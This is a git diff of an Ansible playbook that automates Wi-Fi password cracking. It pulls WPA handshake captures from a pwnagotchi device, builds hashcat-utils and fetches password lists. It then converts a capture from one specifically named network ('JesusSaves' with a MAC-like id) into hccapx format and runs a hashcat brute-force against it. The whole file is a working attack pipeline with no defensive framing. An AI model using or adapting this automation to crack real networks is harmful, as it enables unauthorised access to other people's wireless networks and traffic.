@@ -11,52 +11,62 @@
 
 - hosts: localhost
   vars:
-    p_dir: ~/pwnagotchi_handshakes
+    dir_pwnagotchi: ~/pwnagotchi_handshakes
+    dir_hashcat_utils: ~/github/hashcat-utils
 
   tasks:
-  - name: Creating '{{p_dir}}'
+  - name: Creating '{{dir_pwnagotchi}}'
     ansible.builtin.file:
-      path: '{{p_dir}}'
+      path: '{{dir_pwnagotchi}}'
       state: directory
       mode: '0755'
 
-#  - name: Git checkout hcxtools
-#    ansible.builtin.git:
-#      repo: 'https://github.com/ZerBea/hcxtools.git'
-#      dest: '{{p_dir}}/hcxtools'
-#      clone: yes
-#      update: yes
+  - name: Git checkout hashcat-utils
+    ansible.builtin.git:
+      repo: 'https://github.com/hashcat/hashcat-utils.git'
+      dest: '{{dir_hashcat_utils}}'
+      clone: yes
+      update: yes
+
+  - name: Make hashcat binaries
+    shell:
+      cmd: 'cd {{dir_hashcat_utils}}/src; make; mv *.bin {{dir_hashcat_utils}}/bin'
 
   - name: Git checkout password lists
     ansible.builtin.git:
       repo: 'https://github.com/josuamarcelc/common-password-list.git'
-      dest: '{{p_dir}}/password_lists'
+      dest: '{{dir_pwnagotchi}}/password_lists'
       clone: yes
       update: yes
 
-#  - name: Make binaries
-#    shell:
-#      cmd: make; make
 
 - hosts: pwnagotchi
+  ignore_unreachable: true
   vars:
-    p_dir: ~/pwnagotchi_handshakes
+    dir_pwnagotchi: ~/pwnagotchi_handshakes
     timestamp: "{{ '%Y-%m-%d' | strftime }}"
 
   tasks:
   - name: Copy handshakes from pwnagotchi
+    ignore_errors: true
     synchronize:
       src: /home/pi/handshakes/
-      dest: "{{p_dir}}/{{ timestamp }}"
+      dest: "{{dir_pwnagotchi}}/{{timestamp}}"
       mode: pull
       recursive: yes
 
+
 - hosts: localhost
   vars:
-    p_dir: ~/pwnagotchi_handshakes
+    dir_pwnagotchi: ~/pwnagotchi_handshakes
+    dir_hashcat_utils: ~/github/hashcat-utils
     timestamp: "{{ '%Y-%m-%d' | strftime }}"
 
   tasks:
-    - name: Crack PCAP files
+    - name: Make hccapx file from handshake
       shell:
-        cmd: 'cd {{p_dir}}/{{ timestamp }}; hcxpcapngtool *.pcap -o candidates.hc22000 -E {{p_dir}}/password_lists/rockyou.txt/rockyou_1.txt'
+        cmd: '{{dir_hashcat_utils}}/bin/cap2hccapx.bin {{dir_pwnagotchi}}/{{timestamp}}/JesusSaves_40e1e441f2b3.pcap {{dir_pwnagotchi}}/{{timestamp}}/JesusSaves_40e1e441f2b3.hccapx'
+
+    - name: Start bruteforcing using hashcat
+      shell:
+        cmd: 'hashcat -m 2500 --force -a 3 {{dir_pwnagotchi}}/{{timestamp}}/JesusSaves_40e1e441f2b3.hccapx'
